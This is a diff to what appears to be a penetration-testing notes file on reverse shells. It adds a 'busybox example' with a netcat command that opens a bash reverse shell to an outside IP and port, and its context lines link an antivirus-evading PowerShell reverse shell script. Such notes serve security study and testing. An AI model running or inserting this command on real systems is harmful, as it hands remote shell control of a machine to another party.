@@ -133,6 +133,12 @@ And then change the var names in the rev shell script (already done in this shel
 	https://github.com/Andre92Marcos/myScripts/blob/main/rev_shell_anti_virus.ps1
 
 
+### busybox example
+
+```shell
+busybox nc 10.10.10.10 9001 -e /bin/bash
+```
+
 ## Resources
 
 https://security-tips.vincd.com/reverse-shell/
